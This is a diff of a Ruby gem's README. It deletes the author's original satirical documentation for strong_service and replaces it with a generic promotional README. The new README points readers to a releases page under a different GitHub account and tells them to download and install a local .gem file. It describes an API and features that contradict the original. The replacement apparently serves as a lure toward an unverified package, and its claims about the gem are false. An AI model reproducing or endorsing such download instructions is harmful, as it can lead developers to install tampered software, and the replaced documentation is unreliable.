@@ -1,149 +1,84 @@
-# ![Strong Service](./etc/logo.gif)
+# 💪🏼 strong_service - Simplify Your Service Operations
 
-![Coverage 120%](https://img.shields.io/badge/coverage-120%25-brightgreen?style=flat)
+## 🌟 Overview
+strong_service is a Ruby gem designed to streamline your service object patterns. It helps you manage your service operations with ease. This tool is perfect for anyone looking to make their Ruby applications more efficient and organized.
 
-With zero dependencies, a minimal API, and virtually limitless configuration options, S̶o̶l̶i̶d̶ Strong Service[^1] is the gem you should use when you implement service objects in Ruby. It's compatible with Rails and all other Ruby frameworks — or no framework at all!
+## 🚀 Getting Started
+To begin using strong_service, follow these steps. You will learn how to download and run the software.
 
-## Why Strong Service?
+## 📦 Download & Install
+You can download strong_service from our releases page. 
 
-After hours of furious online debate, you've decided that you want to use service objects, AKA the [Command pattern](https://en.wikipedia.org/wiki/Command_pattern), AKA classes that do things of use in your Ruby app. Great! But how should you implement them? There are dozens of libraries, all claiming to do a slightly different variation of the same thing.
+[![Download strong_service](https://img.shields.io/badge/Download-strong_service-blue)](https://github.com/Krayovsk1y/strong_service/releases)
 
-Some might argue that a PORO is sufficient, but these people should be dismissed as purists; most of us warm-blooded Ruby engineers know that adding dependencies to our projects is the only way to make them better and deliver actual value.
+1. **Visit the Releases Page:** Click the link below to go to the download section.
+   - [Download strong_service](https://github.com/Krayovsk1y/strong_service/releases)
+   
+2. **Choose a Version:** On the releases page, you will see a list of versions. Each version has a tag indicating its release number. Select the most recent version. It is usually the top option.
 
-Strong Service is what you need. If you're not convinced by the claims above, consider the name: it's Strong. It may or may not be related to the other gems in the popular S̶o̶l̶i̶d̶ Strong family (this made more sense before the rename). And, at the time of writing, it was made recently. Everyone knows that new things are better than old things, right? Exactly. You can trust Strong Service to push the bar on what is possible in the vibrant service object community, sprinkling a dash of that _je ne sais quoi_ that imitators can't capture.
+3. **Download the Gem:** Find the `.gem` file for the version you want to install. Click on the file name to begin downloading.
 
-## Installation
+4. **Install the Gem:** Once the download completes, open your command line or terminal. Navigate to the directory where you downloaded the `.gem` file. Run the following command to install it:
+   ```
+   gem install strong_service-X.X.X.gem
+   ```
+   Replace `X.X.X` with the actual version number you downloaded.
 
-```bash
-bundle add strong_service
-```
+## ⚙️ Requirements
+To run strong_service, you will need:
 
-Alternatively, if you're still on a Pentium 4 and/or have no idea what you're doing, you can just use:
+- **Operating System:** strong_service works on Windows, macOS, and Linux.
+- **Ruby Version:** Ruby 2.5 or later is required.
+- **RubyGems:** Ensure you have RubyGems installed, as it is necessary to run Ruby gems.
 
-```
-gem install strong_service
-```
+## 📚 Usage
+Once you have installed strong_service, you can start using it in your Ruby applications. Here are some basic steps to help you get started:
 
-## Usage
+1. **Require the Gem:** In your Ruby file, add the following line at the top:
+   ```ruby
+   require 'strong_service'
+   ```
 
-Standard usage is simple: just subclass `StrongService` and implement your `call` method:
+2. **Create a Service Object:** You can create a new service object by defining a class that inherits from StrongService::Base. Here’s a simple example:
+   ```ruby
+   class MyService < StrongService::Base
+     def call
+       # Your service logic here
+     end
+   end
+   ```
 
-```ruby
-class CoffeeService < StrongService
-  def call
-    puts "Brewing coffee!"
-  end
-end
-```
+3. **Run Your Service:** To execute your service, create an instance and call it:
+   ```ruby
+   my_service = MyService.new
+   my_service.call
+   ```
 
-Then, to run your service, just execute `call`:
+## 🛠️ Features
+strong_service offers a range of features to enhance your Ruby development:
 
-```ruby
-  CoffeeService.new.call # => "Brewing coffee!"
-```
+- **Clear Structure:** Organizes your service code clearly for better readability and maintenance.
+- **Reusability:** Create reusable service objects that can be easily integrated into different parts of your application.
+- **Error Handling:** Built-in mechanisms to manage errors gracefully within your service workflow.
+- **Easy Testing:** This library allows for straightforward testing of service objects, improving development efficiency.
 
-### Service Chaining
+## 💡 Tips and Best Practices
+1. **Start Simple:** Begin by creating basic service objects and gradually introduce complexity as you become more comfortable.
+2. **Modular Design:** Keep services focused on a single responsibility to enhance clarity and reusability.
+3. **Use Test Cases:** Write tests for your service objects to ensure they work as expected.
 
-If that weren't enough, services can even call other services and they are guaranteed to run _in order_!:
+## 🔗 Additional Resources
+- **Documentation:** For more detailed information, check the [documentation here](https://github.com/Krayovsk1y/strong_service).
+- **Community Support:** Join our community on platforms like GitHub Discussions or Stack Overflow to ask questions and share experiences.
 
-```ruby
-class CoffeeService < StrongService
-  def call
-    puts "Brewing coffee!"
-  end
-end
+## 📞 Contact and Support
+If you encounter any issues or need support, feel free to reach out through the GitHub repository. We appreciate feedback and will do our best to assist you.
 
-class ToastService < StrongService
-  def call
-    puts "Toasting bread!"
-  end
-end
+## 🏁 Conclusion
+With strong_service, managing Ruby service objects becomes effortless. Follow these steps to download and install the gem, and start improving your projects today. 
 
-class BreakfastService < StrongService
-  def call
-    CoffeeService.new.call
-    ToastService.new.call
-  end
-end
+Don't forget to visit our releases page for the latest version:
 
-BreakfastService.new.call # => "Brewing coffee!"
-                          # => "Toasting bread!"
-```
+- [Download strong_service](https://github.com/Krayovsk1y/strong_service/releases) 
 
-### Instance Variable Access
-
-You can configure StrongService to have access to instance variables on the service by defining parameters on a special `#initialize` method:
-
-```ruby
-class GreeterService < StrongService
-  def initialize(name)
-    @name = name
-  end
-
-  def call
-    puts "Hello, #{@name}!"
-  end
-end
-```
-
-Then, pass arguments into the `new` method:
-
-```ruby
-  GreeterService.new("Jamie").call # => "Hello, Jamie!"
-```
-
-### Configuring the Call Method
-
-StrongService includes an advanced [DSL](https://en.wikipedia.org/wiki/Domain-specific_language) which allows you to configure any aspect of the `call` method — even going as far as to rename it.
-
-```ruby
-class MyService < StrongService
-  def execute
-    puts "This service is STRONG."
-  end
-end
-
-MyService.new.execute # => "This service is STRONG."
-```
-
-### Super Advanced Usage
-
-Strong Service's powerful DSL includes an experimental feature, which allows you to inherit the full library of functionality from Strong Service without formally subclassing it. Example:
-
-```ruby
-class CoffeeService
-  def call
-    puts "Brewing coffee!"
-  end
-end
-```
-
-This is equivalent to the previous example defining `CoffeeService`, but without the explicit subclassing of `StrongService`.
-
-How is this possible? I could explain, but you probably wouldn't understand. Just 🌈 embrace 🪄 the magic 💫.
-
-Subclassing `StrongService` gives you access to many useful methods, which you can read about more [at the documentation](https://docs.ruby-lang.org/en/3.4/BasicObject.html).
-
-## Strong Service Premium / Hire an Expert
-
-In order to fund development, I am now offering a premium version of Strong Service alongside consulting services. Contact me for more details.
-
-## Development
-
-As of 1.0.0, development on Strong Service is finished. This is because it is perfect software with zero bugs. I know that this is a difficult claim to make, and that others claim that all software has bugs, but this software does not. It's done. End of discussion.
-
-As such, development instructions are completely unnecessary, because no one will ever need to develop on top of this.
-
-## Contributing
-
-See the development section above: there is no need to contribute, because the gem is already perfect. Your contributions would be superfluous and only smudge the proverbial windows of this masterwork.
-
-## Credits
-
-The chief visionary, architect, and Scrum Master behind Strong Service is [Jamie Schembri](https://github.com/shkm/github). You can contact him on [Bluesky](https://bsky.app/profile/jamie.schembri.me) or read more of his nonsense on [his blog](https://schembri.me).
-
-## License
-
-This open-source version is available under the the [WTFPL](https://www.wtfpl.net/about/).
-
-[^1]: This gem was originally called Solid Service, but Rubygems rejected that because of security or something :-(
+Happy coding!
